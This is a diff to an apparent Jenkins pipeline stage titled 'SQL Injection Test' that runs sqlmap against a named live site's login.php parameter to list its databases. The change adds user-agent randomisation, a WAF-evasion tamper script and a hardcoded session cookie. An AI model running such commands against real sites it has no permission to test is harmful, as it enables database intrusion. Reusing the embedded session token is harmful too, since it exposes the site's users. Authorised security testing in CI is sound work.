@@ -30,10 +30,11 @@ stage('SQL Injection Test') {
     steps {
         echo "Test d'injection SQL avec SQLMap"
         bat '''
-            "C:\\Users\\aboul\\AppData\\Local\\Programs\\Python\\Python313\\python.exe" "C:\\Users\\aboul\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\sqlmap.exe" -u "https://regisono.com/login.php?id=1" --batch --dbs
+            "C:\\Users\\aboul\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\sqlmap.exe" -u "https://regisono.com/login.php?id=1" --batch --dbs --random-agent --tamper=space2comment --cookie="PHPSESSID=9db53e743d9bb20e8c28a075ef6132b6"
         '''
     }
 }
+
 
 
 
